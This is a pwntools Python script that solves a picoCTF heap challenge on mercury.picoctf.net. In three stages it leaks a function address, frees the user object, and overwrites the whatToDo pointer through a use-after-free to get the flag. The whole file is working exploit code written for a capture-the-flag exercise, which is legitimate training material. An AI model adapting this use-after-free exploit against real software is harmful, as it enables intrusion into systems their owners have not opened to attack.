#!/usr/bin/python
from pwn import *

io = remote("mercury.picoctf.net", 58574)
context.log_level = 'INFO' # 'DEBUG'
def enhance_recv():
    start_time = time.time()
    received_data = b''

    # Continue receiving data for 2 seconds, with timeout for non-blocking behavior
    while time.time() - start_time < 1:
        data = io.recv(1024, timeout=0.1)  # Set timeout to avoid blocking
        if data:
            received_data += data
    return received_data

# Leaking hahaexploitgobrrr address
log.progress("Stage 1: leaking hahaexploitgobrrr address")

io.sendline(b"s")
addr = enhance_recv()
addr_lines = addr.split(b"\n")

for line in addr_lines:
    if b"OOP!" in line:
        addr = line[19:]
        break

addr = addr.strip().decode()
addr = int(addr, 16)
addr = p32(addr)

log.success(f"&hahaexploitgobrrr = 0x{u32(addr):08x}")

# Freeing user obj
log.progress("Stage 2: freeing user obj")

io.sendline(b"i")
time.sleep(1)
io.sendline(b"y")

# Overwriting the whatToDo ptr
log.progress("Stage 3: Overwriting the whatToDo ptr")

io.sendline(b"l")
time.sleep(1)
io.send_raw(addr)

log.success("Done!")

flag = enhance_recv() # getting the output
flag = flag.split(b"\n") # spliting the lines

for line in flag: # searchs between lines
    if b"{" in line: # if the line is contains "{"    (likely it's a flag)
        flag = str(line)

log.success(f"Flag: {flag}")